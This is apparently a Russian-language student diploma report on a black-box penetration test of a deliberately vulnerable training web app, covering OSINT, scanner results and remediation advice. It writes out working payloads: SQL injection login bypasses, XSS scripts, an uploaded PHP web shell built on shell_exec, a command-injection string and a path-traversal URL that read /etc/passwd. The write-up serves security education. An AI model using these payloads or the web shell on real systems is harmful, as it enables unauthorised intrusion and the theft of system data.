# Дипломная работа по профессии «Специалист по информационной безопасности»

## Track Penetration Testing

### Задача

Нужно протестировать сервис на безопасность — провести полноценое тестирование на проникновение методом чёрного ящика. Известен только адрес тестируемого приложения — 92.51.39.106.


## Этапы тестирования

### Этап 1. OSINT

**WHOIS** 

Результаты:

* Организация: "TIMEWEB"
* Владелец: Igor Gilmutdinov
* Адрес: Россия (RU), 196006, Saint-Petersburg, Zastavskaya str., 22/2 lit.A
* Электронная почта: abuse@timeweb.ru
* Телефоны: +78122481081, +74950331081

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-1.png)

**Shodan**

Результат запроса в Shodah: [(https://www.shodan.io/host/92.51.39.106](https://www.shodan.io/host/92.51.39.106)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-2.png)
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-3.png)

Найдены открытые порты:

22 (TCP) - OpenSSH8.2p1 Ubuntu 4ubuntu0.13

8050 (TCP) - Server: Apache/2.4.7 (Ubuntu)

Используется версия PHP 5.5.9 на сервере. На сайте **cvedetails.com** данная версия указана как устаревшая со множеством уязвимостей:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-7.png)

**Google Dorking**  

Скрытые страницы и конфиденциальные файлы не обнаружены:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-4.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-5.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-6.png)

**check-risk.ru**

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-15.png)

Результат: открыты 22, 8050, 7788 порты.

**whatweb**

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-44.png)

Найдено два сервиса:

8050 (TCP) -  NetologyVulnApp.com использует HTTPServer: Apache/2.4.7 (Ubuntu)

7788 (TCP) - Beemers использует HTTPServer: TornadoServer/5.1.1

На  https://www.cvedetails.com найдены уязвимости по данны версии сервера TornadoServer:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-46.png)

На основании вышеизложенного мы выбираем цели  для сканирования - http://92.51.39.106:8050/  и http://92.51.39.106:7788/ 


### Этап 2. Scanning

**NMap**

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-8.png)

Результат:
Открыт порт 22 - OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0).

**Spiderfoot**

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-11.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-9.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-10.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-13.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-14.png)

Результат:

* Открыт порт 22 - OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0).
* Cеть 92.51.39.0/24
* Эл.почта: abuse@timeweb.ru

**Nikto Scan**
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-50.png)

Результаты:
Заголовок X-Frame-Options, защищающий от перехвата кликов, отсутствует. 
+ /: Заголовок X-Content-Type-Options не задан. Это может позволить агенту пользователя отображать содержимое сайта способом, отличным от типа MIME. 
+ /: Файл cookie PHPSESSID создан без флага httponly. 
+ Apache/2.4.7 устарел.
+ /: Веб-сервер возвращает корректный ответ с использованием нежелательных HTTP-методов, которые могут вызывать ложные срабатывания.
+ /admin/login.php?action=insert&username=test&password=test: phpAuction может разрешить установку учетных записей администратора без надлежащей аутентификации. Попытайтесь войти в систему с паролем пользователя 'test' для проверки.
+ /admin/: Ошибка включения в PHP может указывать на возможность включения локального или удаленного файла.
+ /admin/login.php: Найдена страница/раздел для входа в систему администратора.

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-49.png)

Результаты:

+ Отсутствует заголовок X-Frame-Options (возможны clickjacking-атаки).
+ Отсутствует заголовок X-Content-Type-Options.
+ Обнаружена страница /login.html.

**Acunetix**

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-25.png)

Результат:
* Уязвимость критического уровня является - SQL Injection.
* Уязвимость высокого уровня -Cross Site Scripting и Local File Inclusion. 

Файл с отчетом сканирования Acunetix порта 8050 - [отчет](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/20251009_Developer_http_92_51_39_106_8050_.pdf)

**zaproxy**

8050
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-24.png)

Файл с отчетом: [отчет 8050](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/2025-11-06-ZAP-Report-.html)

7788

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-16.png)

Файл с отчетом: [отчет 7788](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/port7788-ZAP-Report-.html)


### Этап 3. Testing

Проверим некоторые уязвимости вручную.

#### Цель: http://92.51.39.106:8050

**SQL Injections**
По адресу http://92.51.39.106:8050/users/login.php, в поле Username вводим admin' or '1'='1'#, а в поле Password, например- 123:
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-20.png)
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-21.png)

**Cross Site Scripting (DOM Based)**

По адресу http://92.51.39.106:8050/guestbook.php введем код JavaScript в поле комментария-

```
<script>alert('simple attack')</script>
```

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-19.png)

После сохранения комментария видим, что атака удалась:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-26.png)

**Cross Site Scripting (Persistent)**
Введем в форму отправки комментария код:
```
<script>alert('You are hacked!')</script>
```
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-27.png)

После сохранения комментария код выполняется:
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-28.png)

**Cross Site Scripting (Reflected)**
На сайте в форме поиска введем в строку поиска код :
```
<a href="http://92.51.39.106:8050/" onclick="alert('Cross Site Scripting (Reflected) attack!'); return false;">Ссылка на x-сайт </a>
```

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-29.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-30.png)

По ссылке получим сообщение в браузере:
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-31.png)

**Local File Inclusion**
 Cоздадим файл file.php следующего содержания:
 ```
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['cmd'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>
<form method="post">
    Command: <input type="text" name="cmd">
    <input type="submit" value="Run command!">
</form>
 ```
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-32.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-33.png)

Файл загружен:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-45.png)

Код выполнился:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-47.png)

Вводим:

```
whoami; pwd; cat /etc/passwd
```

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-48.png)


#### Цель: http://92.51.39.106:7788

**SQL Injections**
По адресу http://92.51.39.106:7788/login.html  в поле Username введем admin' or '1'='1--, а в поле Password, например - 123:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-17.png)

Авторизация успешна:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-18.png)

 **Remote OS Command Injection** 

 По адресу http://92.51.39.106:7788/server.html ввести:

 ``` 127.0.0.1&cat /etc/passwd&
```

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-34.png)

**Cross Site Scripting (DOM Based)**

По адресу http://92.51.39.106:7788/index.html введем в поле поиска :

```
<script>alert('simple attack')</script>
```
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-38.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-39.png)

**Cross Site Scripting (Reflected)**
На сайте в форме поиска введем в строку поиска код :
```
<a href="http://92.51.39.106:8050/" onclick="alert('Cross Site Scripting (Reflected) attack!'); return false;">Ссылка на x-сайт </a>
```
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-40.png)

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-41.png)

 Кликнем по ссылке, и получим сообщение в браузере:

![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-42.png)

**Path Traversal**
```
 http://92.51.39.106:7788/read?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

```
![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-43.png)




### Рекомендации по исправлению уязвимостей.

1. Рекомендуется обновить устаревшие версии ОС и сервисов, настроить межсетевой экран (firewall) и систему защиты от брутфорса.

2. Для защиты от SQL-инъекций (атак с внедрением SQL-кода) рекомендуются параметризованные запросы, валидация ввода,  экранирование, мониторинг.

3.  Для устранения уязвимостей cross-site scripting xss рекомендуется:

    На стороне сервера
    * Экранировать или фильтровать данные перед их отображением, чтобы предотвратить выполнение вредоносного кода. 
    * Валидировать данные и настроить строгие критерии для ввода.
    * Использовать библиотеки для очистки HTML-кода (например, DOMPurify).
    * Регулярно обновлять программное обеспечение.
 
    На стороне клиента
    * Настроить политику безопасности контента (CSP).
    * Не использовать JavaScript прямо в HTML.
    * Использовать современные фреймворки и библиотеки.




